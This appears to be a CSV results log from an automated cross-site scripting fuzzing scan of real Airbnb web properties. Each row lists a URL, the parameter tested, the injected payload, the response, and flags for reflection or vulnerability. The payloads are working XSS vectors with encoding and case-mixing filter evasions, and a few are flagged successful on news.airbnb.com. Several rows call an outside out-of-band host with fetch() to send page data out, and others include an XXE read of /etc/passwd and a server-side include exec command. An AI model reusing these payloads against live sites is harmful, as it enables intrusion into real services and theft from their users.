url,param,payload,server_type,method,response_code,response_time,response_pattern,success,content_snippet,vulnerable,injection_context,nlp_forms_found,nlp_inputs_count,nlp_scripts_found,nlp_has_eval_or_write,nlp_has_sanitization_patterns,nlp_reflected_location_type,fuzz_num_filtered,fuzz_num_encoded
https://investors.airbnb.com/governance/default.aspx,__antiCSRF,"<img src=""http://example.com/image.jpg"">",nginx,POST,403,2.5167782306671143,"<html lang=""en-US"" dir=""ltr""><head><title>Just a moment...</title><meta http-equiv=""Content-Type"" co",0,"<html lang=""en-US"" dir=""ltr""><head><title>Just a moment...</title><meta http-equiv=""Content-Type"" co",0,generic,0,0,1,0,0,none,10,2
http://airbnb.com/?logo=1#simple-header-locale-menu-combined,query,&#x3c;BODY ONLOAD=alert('XSS')&#x3e;,nginx,GET,200,3.629636287689209,"<html lang=""en"" dir=""ltr"" data-is-hyperloop=""true"" data-is-async-local-storage=""true"" class=""scrollb",0,"<html lang=""en"" dir=""ltr"" data-is-hyperloop=""true"" data-is-async-local-storage=""true"" class=""scrollb",0,generic,1,1,1,0,0,none,11,1
https://investors.airbnb.com/resources/default.aspx,_ctrl0$ctl36$btnSubmit,"';ALerT(STrinG.fRomcharCoDe(88,83,83))//';aLErT(strinG.fRoMCharCOde(88,83,83))//"";aLErT(stRing.frOmCHarcodE(88,83,83))//"";aLert(STRinG.frOMchARCode(88,83,83))//--></sCrIPt>"">';AlerT(StRIng.frOmcHaRcOdE(88,83,83))//';AleRt(StRINg.fRoMchArCoDE(88,83,83))//"";ALERt(stRIng.FROMCHArcOde(88,83,83))//"";alErT(STRInG.fROMCHaRCODE(88,83,83))//--></SCRiPt>",nginx,POST,403,2.7718100547790527,"<html lang=""en-US"" dir=""ltr""><head><title>Just a moment...</title><meta http-equiv=""Content-Type"" co",0,"<html lang=""en-US"" dir=""ltr""><head><title>Just a moment...</title><meta http-equiv=""Content-Type"" co",0,generic,0,0,1,0,0,none,11,1
https://community.withairbnb.com/t5/community/categorypage.searchformv32.form.form,submitContext,"<img src=x onerror=eval(String.fromCharCode(97,108,101,114,116,40,49,41))>",apache,POST,500,5.57278299331665,"<html prefix=""og: http://ogp.me/ns#"" dir=""ltr"" lang=""en"" class=""js no-flash filereader exiforientati",0,"<html prefix=""og: http://ogp.me/ns#"" dir=""ltr"" lang=""en"" class=""js no-flash filereader exiforientati",0,generic,1,30,1,0,0,none,0,0
https://investors.airbnb.com/financials/default.aspx,__VIEWSTATE,"<IMG fOO=A SRC=""JavAsCRipT:alERT('XsS')"">",nginx,POST,403,2.779818534851074,"<html lang=""en-US"" dir=""ltr""><head><title>Just a moment...</title><meta http-equiv=""Content-Type"" co",0,"<html lang=""en-US"" dir=""ltr""><head><title>Just a moment...</title><meta http-equiv=""Content-Type"" co",0,generic,0,0,1,0,0,none,10,2
https://investors.airbnb.com/governance/default.aspx,__RequestVerificationAntiCSRFToken,"javascript:eval(%00""alert(&#x27;XSS&#x27;)%00"")",nginx,POST,403,2.879840612411499,"<html lang=""en-US"" dir=""ltr""><head><title>Just a moment...</title><meta http-equiv=""Content-Type"" co",0,"<html lang=""en-US"" dir=""ltr""><head><title>Just a moment...</title><meta http-equiv=""Content-Type"" co",0,generic,0,0,1,0,0,none,10,2
https://investors.airbnb.com/resources/default.aspx,_ctrl0$ctl43$txtEmailAddress,&#x22&#x3e;&#x3c;img src=x onerror=alert('XSS')&#x3e;,nginx,POST,403,2.683677911758423,"<html lang=""en-US"" dir=""ltr""><head><title>Just a moment...</title><meta http-equiv=""Content-Type"" co",0,"<html lang=""en-US"" dir=""ltr""><head><title>Just a moment...</title><meta http-equiv=""Content-Type"" co",0,generic,0,0,1,0,0,none,11,1
https://investors.airbnb.com/financials/default.aspx,__antiCSRF,<img src=x on/**/error=fetch('//99o5acu1yd5e.oast.pro/img?loc='+btoa(window.location))>,nginx,POST,403,2.310739040374756,"<html lang=""en-US"" dir=""ltr""><head><title>Just a moment...</title><meta http-equiv=""Content-Type"" co",0,"<html lang=""en-US"" dir=""ltr""><head><title>Just a moment...</title><meta http-equiv=""Content-Type"" co",0,generic,0,0,1,0,0,none,10,2
http://airbnb.com/?utm_source=airbnb&utm_medium=1&utm_campaign=direct&utm_content=1750108736862&purchaseAttemptId=1750108736862,query,%3Ca%20foo%3Da%20href%3D%22javascript%3Aalert%28%27XSS%27%29%22%3EClick%20Me%3C/a%3E,nginx,GET,200,3.473299503326416,"<html lang=""en"" dir=""ltr"" data-is-hyperloop=""true"" data-is-async-local-storage=""true"" class=""scrollb",0,"<html lang=""en"" dir=""ltr"" data-is-hyperloop=""true"" data-is-async-local-storage=""true"" class=""scrollb",0,generic,1,1,1,0,0,none,10,2
https://investors.airbnb.com/resources/default.aspx,_ctrl0$ctl43$btnUnsubscribe,"%00<img src=%00""vbscript:alert(%00'XSS%00')%00""%00>",nginx,POST,403,2.9367868900299072,"<html lang=""en-US"" dir=""ltr""><head><title>Just a moment...</title><meta http-equiv=""Content-Type"" co",0,"<html lang=""en-US"" dir=""ltr""><head><title>Just a moment...</title><meta http-equiv=""Content-Type"" co",0,generic,0,0,1,0,0,none,11,1
https://community.withairbnb.com/t5/community/categorypage.searchformv32.form.form,messageSearchField,"<IMG SRc=x oNErrOr=aLErt(""XsS"")>",apache,POST,500,5.058628797531128,"<html prefix=""og: http://ogp.me/ns#"" dir=""ltr"" lang=""en"" class=""js no-flash filereader exiforientati",0,"<html prefix=""og: http://ogp.me/ns#"" dir=""ltr"" lang=""en"" class=""js no-flash filereader exiforientati",0,generic,1,30,1,0,0,none,0,0
https://investors.airbnb.com/financials/default.aspx,__RequestVerificationAntiCSRFToken,"%00<input type=%00""text%00"" value=%00""%00<img src=x onerror=alert(&#x27;XSS&#x27;)%00>%00"" /%00>",nginx,POST,403,2.405299663543701,"<html lang=""en-US"" dir=""ltr""><head><title>Just a moment...</title><meta http-equiv=""Content-Type"" co",0,"<html lang=""en-US"" dir=""ltr""><head><title>Just a moment...</title><meta http-equiv=""Content-Type"" co",0,generic,0,0,1,0,0,none,10,2
https://investors.airbnb.com/resources/default.aspx,__antiCSRF,<IMG SRC=x OneRrOR=ALerT(1)>,nginx,POST,403,2.4721691608428955,"<html lang=""en-US"" dir=""ltr""><head><title>Just a moment...</title><meta http-equiv=""Content-Type"" co",0,"<html lang=""en-US"" dir=""ltr""><head><title>Just a moment...</title><meta http-equiv=""Content-Type"" co",0,generic,0,0,1,0,0,none,11,1
https://community.withairbnb.com/t5/community/categorypage.searchformv32.form.form,messageSearchField_0,"<img src=x on/**/error=alert(""XSS"")>",apache,POST,500,2.3674802780151367,"<html prefix=""og: http://ogp.me/ns#"" dir=""ltr"" lang=""en"" class=""js no-flash filereader exiforientati",0,"<html prefix=""og: http://ogp.me/ns#"" dir=""ltr"" lang=""en"" class=""js no-flash filereader exiforientati",0,generic,1,30,1,0,0,none,0,0
https://news.airbnb.com/nl/,s,"<img src=""vbscript:al	ert(1)('XSS')"">",nginx,GET,200,3.4358341693878174,"<html lang=""nl-NL""><head>
  <meta charset=""utf-8"">
  <meta http-equiv=""x-ua-compatible"" content=""ie=",0,"<html lang=""nl-NL""><head>
  <meta charset=""utf-8"">
  <meta http-equiv=""x-ua-compatible"" content=""ie=",0,attribute,1,2,1,0,0,attribute,0,0
https://investors.airbnb.com/resources/default.aspx,__RequestVerificationAntiCSRFToken,%00<img%00>,nginx,POST,403,2.2643585205078125,"<html lang=""en-US"" dir=""ltr""><head><title>Just a moment...</title><meta http-equiv=""Content-Type"" co",0,"<html lang=""en-US"" dir=""ltr""><head><title>Just a moment...</title><meta http-equiv=""Content-Type"" co",0,generic,0,0,1,0,0,none,11,1
https://community.withairbnb.com/t5/community/categorypage.searchformv32.form.form,userSearchField,%3Cimg%20src%3Dx%20onerror%3Deval%28String.fromCharCode%2897%2C108%2C101%2C114%2C116%2C40%2C49%2C41%29%29%3E,apache,POST,500,2.3196938037872314,"<html prefix=""og: http://ogp.me/ns#"" dir=""ltr"" lang=""en"" class=""js no-flash filereader exiforientati",0,"<html prefix=""og: http://ogp.me/ns#"" dir=""ltr"" lang=""en"" class=""js no-flash filereader exiforientati",0,generic,1,30,1,0,0,none,0,0
https://investors.airbnb.com/resources/default.aspx,__SCROLLPOSITIONX,"<img foo=a on/**/error=""alert('XSS')"">",nginx,POST,403,2.3363585472106934,"<html lang=""en-US"" dir=""ltr""><head><title>Just a moment...</title><meta http-equiv=""Content-Type"" co",0,"<html lang=""en-US"" dir=""ltr""><head><title>Just a moment...</title><meta http-equiv=""Content-Type"" co",0,generic,0,0,1,0,0,none,11,1
http://airbnb.com/gift/buy?country=US&card_name=fields,delivery_method_digital,"&#x3c;img src=""http://example.com/image.jpg""&#x3e;",nginx,GET,200,4.18874454498291,"<html translate=""no""><head><meta charset=""utf-8""><meta name=""viewport"" content=""width=device-width,i",0,"<html translate=""no""><head><meta charset=""utf-8""><meta name=""viewport"" content=""width=device-width,i",0,generic,1,8,1,0,1,none,9,3
https://investors.airbnb.com/press-releases/default.aspx,__EVENTTARGET,"%00<TD BACKGROUND=%00""javascript:alert(&#x27;XSS&#x27;)%00""%00>",nginx,POST,403,2.4111745357513428,"<html lang=""en-US"" dir=""ltr""><head><title>Just a moment...</title><meta http-equiv=""Content-Type"" co",0,"<html lang=""en-US"" dir=""ltr""><head><title>Just a moment...</title><meta http-equiv=""Content-Type"" co",0,generic,0,0,1,0,0,none,10,2
https://investors.airbnb.com/resources/default.aspx,__SCROLLPOSITIONY,&#x22><img src=x onerror=al	ert(1)('XSS')>,nginx,POST,403,2.6136250495910645,"<html lang=""en-US"" dir=""ltr""><head><title>Just a moment...</title><meta http-equiv=""Content-Type"" co",0,"<html lang=""en-US"" dir=""ltr""><head><title>Just a moment...</title><meta http-equiv=""Content-Type"" co",0,generic,0,0,1,0,0,none,11,1
https://news.airbnb.com/en-in/,s,&#x22><img src=x onerror=alert('XSS')>,nginx,GET,200,3.191488742828369,"<html lang=""en-US""><head>
  <meta charset=""utf-8"">
  <meta http-equiv=""x-ua-compatible"" content=""ie=",0,"<html lang=""en-US""><head>
  <meta charset=""utf-8"">
  <meta http-equiv=""x-ua-compatible"" content=""ie=",0,attribute,1,2,1,0,0,attribute,0,0
https://investors.airbnb.com/press-releases/default.aspx,__EVENTARGUMENT,<img>,nginx,POST,403,2.575387954711914,"<html lang=""en-US"" dir=""ltr""><head><title>Just a moment...</title><meta http-equiv=""Content-Type"" co",0,"<html lang=""en-US"" dir=""ltr""><head><title>Just a moment...</title><meta http-equiv=""Content-Type"" co",0,generic,0,0,1,0,0,none,10,2
http://airbnb.com/gift/buy?country=US&card_name=fields,delivery_method_sms,%3Cform%20action%3D%22javascript%3Aalert%28%27XSS%27%29%22%3E%3Cinput%20type%3D%22submit%22%3E%3C/form%3E,nginx,GET,200,2.9577627182006836,"<html translate=""no""><head><meta charset=""utf-8""><meta name=""viewport"" content=""width=device-width,i",0,"<html translate=""no""><head><meta charset=""utf-8""><meta name=""viewport"" content=""width=device-width,i",0,generic,1,8,1,0,1,none,9,3
https://community.withairbnb.com/t5/community/categorypage.searchformv32.form.form,noteSearchField,%3Cimg%20src%3D%22x%22%20onerror%3D%22alert%28%27XSS%27%29%22%20/%3E,apache,POST,-1,4.0587499141693115,"<html prefix=""og: http://ogp.me/ns#"" dir=""ltr"" lang=""en"" class=""js no-flash filereader exiforientati",0,"<html prefix=""og: http://ogp.me/ns#"" dir=""ltr"" lang=""en"" class=""js no-flash filereader exiforientati",0,generic,1,30,1,0,0,none,0,0
http://airbnb.com,query,"<form action=""javascript:al	ert(1)('XSS')""><input type=""submit""></form>",nginx,GET,200,3.718859910964966,"<html lang=""en"" dir=""ltr"" data-is-hyperloop=""true"" data-is-async-local-storage=""true"" class=""dir nat",0,"<html lang=""en"" dir=""ltr"" data-is-hyperloop=""true"" data-is-async-local-storage=""true"" class=""dir nat",0,generic,1,0,1,0,0,none,0,0
https://investors.airbnb.com/press-releases/default.aspx,__VIEWSTATE,"&#x3c;img src=x onerror=confirm(""XSS"")&#x3e;",nginx,POST,403,3.06711483001709,"<html lang=""en-US"" dir=""ltr""><head><title>Just a moment...</title><meta http-equiv=""Content-Type"" co",0,"<html lang=""en-US"" dir=""ltr""><head><title>Just a moment...</title><meta http-equiv=""Content-Type"" co",0,generic,0,0,1,0,0,none,10,2
https://investors.airbnb.com/press-releases/default.aspx,_ctrl0$ctl33$selectEvergreenNewsYear,"&#x3c;!--#exec cmd=""/bin/echo '&#x3c;SCR'+'IPT&#x3e;alert(""XSS"")&#x3c;/SCR'+'IPT&#x3e;'""--&#x3e;",nginx,POST,403,2.3993964195251465,"<html lang=""en-US"" dir=""ltr""><head><title>Just a moment...</title><meta http-equiv=""Content-Type"" co",0,"<html lang=""en-US"" dir=""ltr""><head><title>Just a moment...</title><meta http-equiv=""Content-Type"" co",0,generic,0,0,1,0,0,none,10,2
https://community.withairbnb.com/t5/community/categorypage.searchformv32.form.form,productSearchField,"<STYle>lI {LIST-sTyle-iMaGe: url(""javaSCrIPT:ALErt('XsS')"");}</sTylE><UL><li></uL>",apache,POST,500,2.3265280723571777,"<html prefix=""og: http://ogp.me/ns#"" dir=""ltr"" lang=""en"" class=""js no-flash filereader exiforientati",0,"<html prefix=""og: http://ogp.me/ns#"" dir=""ltr"" lang=""en"" class=""js no-flash filereader exiforientati",0,generic,1,30,1,0,0,none,0,0
http://airbnb.com/gift/buy?country=US&card_name=fields,recipient_name,<svg/onload=fetch('//99o5acu1yd5e.oast.pro/svg?loc='+btoa(window.location))>,nginx,GET,200,3.59736967086792,"<html translate=""no""><head><meta charset=""utf-8""><meta name=""viewport"" content=""width=device-width,i",0,"<html translate=""no""><head><meta charset=""utf-8""><meta name=""viewport"" content=""width=device-width,i",0,generic,1,8,1,0,1,none,9,3
https://investors.airbnb.com/press-releases/default.aspx,__antiCSRF,"&#x3c;img src=x onerror=eval(""alert('XSS')"")&#x3e;",nginx,POST,403,2.6595096588134766,"<html lang=""en-US"" dir=""ltr""><head><title>Just a moment...</title><meta http-equiv=""Content-Type"" co",0,"<html lang=""en-US"" dir=""ltr""><head><title>Just a moment...</title><meta http-equiv=""Content-Type"" co",0,generic,0,0,1,0,0,none,10,2
https://news.airbnb.com/en-au/,s,"javascript:eval(""al	ert(1)('XSS')"")",nginx,GET,200,3.370365619659424,"<html lang=""en-AU""><head>
  <meta charset=""utf-8"">
  <meta http-equiv=""x-ua-compatible"" content=""ie=",1,"<html lang=""en-AU""><head>
  <meta charset=""utf-8"">
  <meta http-equiv=""x-ua-compatible"" content=""ie=",1,attribute,1,2,1,1,0,attribute,0,0
https://community.withairbnb.com/t5/community/categorypage.searchformv32.form.form,as-search-action-id,"<iMG SrC="""">",apache,POST,500,4.265978097915649,"<html prefix=""og: http://ogp.me/ns#"" dir=""ltr"" lang=""en"" class=""js no-flash filereader exiforientati",0,"<html prefix=""og: http://ogp.me/ns#"" dir=""ltr"" lang=""en"" class=""js no-flash filereader exiforientati",0,generic,1,30,1,0,0,none,0,0
http://airbnb.com/gift/buy?country=US&card_name=fields,gift_message,<img src=x onerror=fetch('//99o5acu1yd5e.oast.pro/img?loc='+btoa(window.location))>,nginx,GET,200,2.930527448654175,"<html translate=""no""><head><meta charset=""utf-8""><meta name=""viewport"" content=""width=device-width,i",0,"<html translate=""no""><head><meta charset=""utf-8""><meta name=""viewport"" content=""width=device-width,i",0,generic,1,8,1,0,1,none,9,3
https://investors.airbnb.com/press-releases/default.aspx,__RequestVerificationAntiCSRFToken,%00<BODY ONLOAD=alert(&#x27;XSS&#x27;)%00>,nginx,POST,403,2.3903489112854004,"<html lang=""en-US"" dir=""ltr""><head><title>Just a moment...</title><meta http-equiv=""Content-Type"" co",0,"<html lang=""en-US"" dir=""ltr""><head><title>Just a moment...</title><meta http-equiv=""Content-Type"" co",0,generic,0,0,1,0,0,none,10,2
http://airbnb.com/gift/buy?country=US&card_name=baths,delivery_method_digital,"<TABLE><TD BACKGROUND=""javascript:al	ert(1)('XSS')"">",nginx,GET,200,4.317450761795044,"<html translate=""no""><head><meta charset=""utf-8""><meta name=""viewport"" content=""width=device-width,i",0,"<html translate=""no""><head><meta charset=""utf-8""><meta name=""viewport"" content=""width=device-width,i",0,generic,1,8,1,0,1,none,9,3
http://airbnb.com/services,query,"<!DOCTYPE foo [<!ENTITY xxe SYSTEM ""file:///etc/passwd"">]><foo>&xxe;</foo>",nginx,GET,200,3.1644694805145264,"<html lang=""en"" dir=""ltr"" data-is-hyperloop=""true"" data-is-async-local-storage=""true"" class=""scrollb",0,"<html lang=""en"" dir=""ltr"" data-is-hyperloop=""true"" data-is-async-local-storage=""true"" class=""scrollb",0,attribute,1,1,1,0,0,attribute,0,0
http://airbnb.com/gift/buy?country=US&card_name=fields,sender_name,"""&#x3e;&#x3c;script&#x3e;alert(""XSS"")&#x3c;/script&#x3e;",nginx,GET,200,3.549881935119629,"<html translate=""no""><head><meta charset=""utf-8""><meta name=""viewport"" content=""width=device-width,i",0,"<html translate=""no""><head><meta charset=""utf-8""><meta name=""viewport"" content=""width=device-width,i",0,generic,1,8,1,0,1,none,9,3
http://airbnb.com/gift/buy?country=US&card_name=baths,delivery_method_sms,%3Ciframe%20src%3D%22javascript%3Aalert%28%27XSS%27%29%22%3E%3C/iframe%3E,nginx,GET,200,3.437692403793335,"<html translate=""no""><head><meta charset=""utf-8""><meta name=""viewport"" content=""width=device-width,i",0,"<html translate=""no""><head><meta charset=""utf-8""><meta name=""viewport"" content=""width=device-width,i",0,generic,1,8,1,0,1,none,9,3
https://community.withairbnb.com/t5/forums/forumpage.searchformv32.form.form,t:ac,"<input type=""text"" value=""<img src=x onerror=al	ert(1)('XSS')>"" />",apache,POST,500,3.482184886932373,"<html prefix=""og: http://ogp.me/ns#"" dir=""ltr"" lang=""en"" class=""js no-flash filereader exiforientati",0,"<html prefix=""og: http://ogp.me/ns#"" dir=""ltr"" lang=""en"" class=""js no-flash filereader exiforientati",0,generic,1,30,1,0,0,none,0,0
http://airbnb.com/gift/buy?country=US&card_name=baths,recipient_name,"JavaScrIPT:aLerT(""xsS"")",nginx,GET,200,3.417056083679199,"<html translate=""no""><head><meta charset=""utf-8""><meta name=""viewport"" content=""width=device-width,i",0,"<html translate=""no""><head><meta charset=""utf-8""><meta name=""viewport"" content=""width=device-width,i",0,generic,1,8,1,0,1,none,9,3
http://airbnb.com/#Schedule1,query,"<!--#exec cmd=""/bin/echo '<SCR'+'IPT>al	ert(1)(""XSS"")</SCR'+'IPT>'""-->",nginx,GET,200,3.6155455112457275,"<html lang=""en"" dir=""ltr"" data-is-hyperloop=""true"" data-is-async-local-storage=""true"" class=""scrollb",0,"<html lang=""en"" dir=""ltr"" data-is-hyperloop=""true"" data-is-async-local-storage=""true"" class=""scrollb",0,generic,1,1,1,0,0,none,11,1
https://news.airbnb.com/nl-be/,s,%27%3Balert%28String.fromCharCode%2888%2C83%2C83%29%29//%27%3Balert%28String.fromCharCode%2888%2C83%2C83%29%29//%22%3Balert%28String.fromCharCode%2888%2C83%2C83%29%29//%22%3Balert%28String.fromCharCode%2888%2C83%2C83%29%29//--%3E%3C/SCRIPT%3E%22%3E%27%3Balert%28String.fromCharCode%2888%2C83%2C83%29%29//%27%3Balert%28String.fromCharCode%2888%2C83%2C83%29%29//%22%3Balert%28String.fromCharCode%2888%2C83%2C83%29%29//%22%3Balert%28String.fromCharCode%2888%2C83%2C83%29%29//--%3E%3C/SCRIPT%3E,nginx,GET,200,3.938020706176758,"<html lang=""nl-BE""><head>
  <meta charset=""utf-8"">
  <meta http-equiv=""x-ua-compatible"" content=""ie=",1,"<html lang=""nl-BE""><head>
  <meta charset=""utf-8"">
  <meta http-equiv=""x-ua-compatible"" content=""ie=",1,script,1,2,1,0,0,script_content,0,0
http://airbnb.com/?utm_source=airbnb&utm_medium=1&utm_campaign=direct&utm_content=1750108742522&purchaseAttemptId=1750108742522&card_id=9025,query,"%00<img src=%00""x%00"" onerror=%00""alert(&#x27;XSS&#x27;)%00"" /%00>",nginx,GET,200,5.025812149047852,"<html lang=""en"" dir=""ltr"" data-is-hyperloop=""true"" data-is-async-local-storage=""true"" class=""scrollb",0,"<html lang=""en"" dir=""ltr"" data-is-hyperloop=""true"" data-is-async-local-storage=""true"" class=""scrollb",0,generic,1,1,1,0,0,none,10,2
https://community.withairbnb.com/t5/forums/forumpage.searchformv32.form.form,t:cp,%3CBODY%20ONLOAD%3Dalert%28%27XSS%27%29%3E,apache,POST,500,8.930043458938599,"<html prefix=""og: http://ogp.me/ns#"" dir=""ltr"" lang=""en"" class=""js no-flash filereader exiforientati",0,"<html prefix=""og: http://ogp.me/ns#"" dir=""ltr"" lang=""en"" class=""js no-flash filereader exiforientati",0,generic,1,30,1,0,0,none,0,0
